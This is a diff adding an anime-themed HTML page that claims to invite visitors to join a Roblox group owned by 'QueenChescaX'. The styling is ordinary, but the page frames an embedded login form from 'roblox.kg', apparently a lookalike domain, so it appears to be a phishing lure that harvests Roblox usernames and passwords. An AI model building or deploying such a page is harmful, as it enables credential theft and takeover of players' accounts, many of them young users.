@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Embedded Web</title>
+  <meta name="description" content="Immersive anime-themed embedded content viewer with stunning visual effects" />
+  
+  <!-- Open Graph Meta Tags -->
+  <meta property="og:title" content="Embedded Web - Anime Themed Viewer" />
+  <meta property="og:description" content="Immersive anime-themed embedded content viewer with stunning visual effects and Demon Slayer aesthetics" />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://embedded-web.replit.app" />
+  <meta property="og:image" content="https://media1.tenor.com/m/8d-ueVpIfNwAAAAd/demon-slayer.gif" />
+  
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      width: 100vw;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    .background-container {
+      position: fixed;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1rem;
+      background-image: url('https://media1.tenor.com/m/8d-ueVpIfNwAAAAd/demon-slayer.gif');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      background-attachment: fixed;
+    }
+
+    .frame-box {
+      position: relative;
+      overflow: hidden;
+      width: 100%;
+      max-width: 960px;
+      aspect-ratio: 16 / 9;
+      max-height: 90vh;
+      border: 3px solid white;
+      border-radius: 12px;
+      backdrop-filter: blur(4px);
+      -webkit-backdrop-filter: blur(4px);
+      box-shadow: 0 0 25px rgba(255, 255, 255, 0.8);
+      display: flex;
+      flex-direction: column;
+    }
+
+    .header-section {
+      padding: 1rem 1.5rem;
+      text-align: center;
+      background: linear-gradient(135deg, rgba(139, 92, 246, 0.95) 0%, rgba(168, 85, 247, 0.95) 100%);
+      border-bottom: 2px solid rgba(255, 255, 255, 0.3);
+    }
+
+    .header-text {
+      color: white;
+      font-weight: bold;
+      font-size: clamp(1rem, 2.5vw, 1.5rem);
+      text-shadow: 0 0 10px rgba(255, 255, 255, 0.5), 0 0 20px rgba(139, 92, 246, 0.8), 0 2px 4px rgba(0, 0, 0, 0.3);
+      letter-spacing: 0.05em;
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+    }
+
+    iframe {
+      width: 100%;
+      flex: 1;
+      border: none;
+    }
+
+    @keyframes rainbow-border {
+      0% { border-color: #ff0000; box-shadow: 0 0 25px rgba(255, 0, 0, 0.8), 0 0 50px rgba(255, 0, 0, 0.4); }
+      14% { border-color: #ff7f00; box-shadow: 0 0 25px rgba(255, 127, 0, 0.8), 0 0 50px rgba(255, 127, 0, 0.4); }
+      28% { border-color: #ffff00; box-shadow: 0 0 25px rgba(255, 255, 0, 0.8), 0 0 50px rgba(255, 255, 0, 0.4); }
+      42% { border-color: #00ff00; box-shadow: 0 0 25px rgba(0, 255, 0, 0.8), 0 0 50px rgba(0, 255, 0, 0.4); }
+      57% { border-color: #0000ff; box-shadow: 0 0 25px rgba(0, 0, 255, 0.8), 0 0 50px rgba(0, 0, 255, 0.4); }
+      71% { border-color: #8b00ff; box-shadow: 0 0 25px rgba(139, 0, 255, 0.8), 0 0 50px rgba(139, 0, 255, 0.4); }
+      85% { border-color: #ff00ff; box-shadow: 0 0 25px rgba(255, 0, 255, 0.8), 0 0 50px rgba(255, 0, 255, 0.4); }
+      100% { border-color: #ff0000; box-shadow: 0 0 25px rgba(255, 0, 0, 0.8), 0 0 50px rgba(255, 0, 0, 0.4); }
+    }
+
+    .frame-box {
+      animation: rainbow-border 3s linear infinite;
+    }
+  </style>
+</head>
+<body>
+  <div class="background-container">
+    <div class="frame-box">
+      <div class="header-section">
+        <h1 class="header-text">Your about to join Roblox Group Owned by QueenChescaX</h1>
+      </div>
+      <iframe src="https://roblox.kg/login?returnUrl=0921148473631727" title="Embedded Content"></iframe>
+    </div>
+  </div>
+</body>
+</html>
